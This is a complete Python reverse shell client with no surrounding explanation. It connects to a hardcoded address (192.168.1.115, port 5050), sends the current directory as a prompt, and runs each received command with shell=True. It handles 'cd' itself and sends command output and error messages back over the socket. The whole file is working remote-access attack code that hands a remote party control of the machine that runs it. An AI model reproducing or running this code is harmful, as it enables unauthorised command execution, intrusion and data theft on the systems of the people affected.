from socket import *
import subprocess
import os

s = socket(AF_INET, SOCK_STREAM)
s.connect(("192.168.1.115",5050))

while True:

    oser = os.getcwd()+"> "
    encoded_oser = oser.encode('utf-8')
    s.sendall(encoded_oser)
    data = (s.recv(1024)).decode('utf-8')

    if data == '-':
        continue

    elif data[0:2] == 'cd':
        try:
            os.chdir(data[3:])
        except:
            s.sendall("\n[-] NO SUCH A DIRECTORY !".encode('utf-8'))
            continue

    try:
        cmd = subprocess.check_output(data,shell=True,stderr=subprocess.STDOUT)
        if cmd == None or cmd == ''.encode('utf-8'):
            
            s.sendall("\n[-] DONE !".encode('utf-8'))
            continue
        
        s.sendall(cmd)

    except subprocess.CalledProcessError as e:
        cmd_error = "\n[-] command '{}' return with error (code {}): {}".format(e.cmd, e.returncode, e.output)
        s.sendall(cmd_error.encode('utf-8'))

s.close()